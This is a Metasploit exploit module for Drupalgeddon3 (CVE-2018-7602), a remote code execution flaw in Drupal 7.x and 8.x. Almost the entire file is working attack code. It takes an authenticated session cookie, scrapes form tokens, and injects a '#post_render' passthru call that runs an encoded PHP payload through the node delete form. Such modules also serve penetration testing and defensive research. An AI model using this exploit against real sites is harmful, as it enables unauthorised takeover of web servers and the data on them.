# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
   
    include Msf::Exploit::Remote::HttpClient
   
    def initialize(info={})
      super(update_info(info,
        &#039;Name&#039;           => &#039;Drupalgeddon3&#039;,
        &#039;Description&#039;    => %q{
          CVE-2018-7602 / SA-CORE-2018-004
          A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x.
          This potentially allows attackers to exploit multiple attack vectors on a Drupal site
          Which could result in the site being compromised.
          This vulnerability is related to Drupal core - Highly critical - Remote Code Execution
 
          The module can load msf PHP arch payloads, using the php/base64 encoder.
 
          The resulting RCE on Drupal looks like this: php -r &#039;eval(base64_decode(#{PAYLOAD}));&#039;
        },
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         =>
          [
            &#039;SixP4ck3r&#039;,   # Research and port to MSF
            &#039;Blaklis&#039;      # Initial PoC
          ],
        &#039;References&#039;     =>
          [
            [&#039;SA-CORE&#039;, &#039;2018-004&#039;],
            [&#039;CVE&#039;, &#039;2018-7602&#039;],
          ],
        &#039;DefaultOptions&#039;  =>
        {
          &#039;encoder&#039; => &#039;php/base64&#039;,
        },
        &#039;Privileged&#039;     => false,
        &#039;Platform&#039;       => [&#039;php&#039;],
        &#039;Arch&#039;           => [ARCH_PHP],
        &#039;Targets&#039;        =>
          [
            [&#039;User register form with exec&#039;, {}],
          ],
        &#039;DisclosureDate&#039; => &#039;Apr 29 2018&#039;,
        &#039;DefaultTarget&#039;  => 0
      ))
   
      register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [ true, "The target URI of the Drupal installation", &#039;/&#039;]),
          OptString.new(&#039;DRUPAL_NODE&#039;, [ true, "Exist Node Number (Page, Article, Forum topic, or a Post)", &#039;1&#039;]),
          OptString.new(&#039;DRUPAL_SESSION&#039;, [ true, "Authenticated Cookie Session", &#039;&#039;]),
        ])
   
      register_advanced_options(
        [
 
        ])
    end
   
    def uri_path
      normalize_uri(target_uri.path)
    end
 
    def start_exploit
      drupal_node = datastore[&#039;DRUPAL_NODE&#039;]
      res = send_request_cgi({
        &#039;cookie&#039; => datastore[&#039;DRUPAL_SESSION&#039;],
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => "#{uri_path}/node/#{drupal_node}/delete"
      })
      form_token = res.body.scan( /form_token" value="([^>]*)" \/>/).last.first
      print "[*] Token Form -> #{form_token}\n"
      r2 = send_request_cgi({
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;cookie&#039; => datastore[&#039;DRUPAL_SESSION&#039;],
        &#039;uri&#039;       => "#{uri_path}/?q=node/#{drupal_node}/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]=php%20-r%20&#039;#{payload.encoded}&#039;",
        &#039;vars_post&#039; => {
        &#039;form_id&#039;   => &#039;node_delete_confirm&#039;,
        &#039;_triggering_element_name&#039; => &#039;form_id&#039;,
        &#039;form_token&#039;=> "#{form_token}"
        }
      })
      form_build_id = r2.body.scan( /form_build_id" value="([^>]*)" \/>/).last.first
      print "[*] Token Form_build_id -> #{form_build_id}\n"
      r3 = send_request_cgi({
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;cookie&#039; => datastore[&#039;DRUPAL_SESSION&#039;],
        &#039;uri&#039;       => "#{uri_path}/?q=file/ajax/actions/cancel/%23options/path/#{form_build_id}",
        &#039;vars_post&#039; => {
        &#039;form_build_id&#039;   => "#{form_build_id}"
        }
      })
    end
   
    def exploit
      case datastore[&#039;TARGET&#039;]
      when 0
        start_exploit
      else
        fail_with(Failure::BadConfig, "Your target is invalid.")
      end
    end
  end

